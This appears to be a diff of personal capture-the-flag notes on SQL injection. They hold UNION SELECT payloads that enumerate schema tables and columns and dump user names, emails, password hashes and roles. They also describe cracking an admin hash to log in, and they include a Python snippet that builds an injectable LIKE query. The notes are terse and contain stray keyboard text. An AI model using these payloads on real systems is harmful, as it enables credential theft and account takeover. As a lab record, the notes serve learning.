@@ -1,6 +1,6 @@
 query = "t' || 'test"
-query = "' OR 1=2) UNION SELECT 1,2,3) -- comment '"
-query = "bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,6,-- comment '"
+query = "' OR 1=2) UNION SELECT 1,2,3) -- c'"
+query = "bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,6,7 -- c'"
 
 bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,TABLE_NAME,7 FROM information_schema.tables -- comment '
 
@@ -8,11 +8,16 @@ saw table called users
 
 bigion' OR 1=2)) UNION SELECT 1,2,3,4,5,COLUMN_NAME,7 FROM information_schema.columns WHERE table_name = 'users' -- comment '
 
-bigion' OR 1=2)) UNION SELECT 1,fname,lname,email,password,role,7 FROM users -- comment '
+
+b' OR 1=2)) UNION SELECT 1,fname,lname,email,password,role,7 FROM users -- comment '
+
+lkjhgfdsa asdfghjklq@qj	
 
 saw bunch of admin accounts one is admin
 
 I check the hash on crackstation and get the password, then login as admin and get the flag
+
+
 
 Now try products
 
@@ -34,3 +39,5 @@ bigion' OR 1=2)) UNION SELECT 1,fname,lname,email,password,role,7 FROM users; IN
 x = f"((SELECT * FROM table WHERE something LIKE '%{query}%' OR name LIKE '%{query}%') AND bu IS NOT NULL) ORDER BY category'"
 
 print(x)
+
+SELECT username, password FROM users WHERE username = "" and password = "";
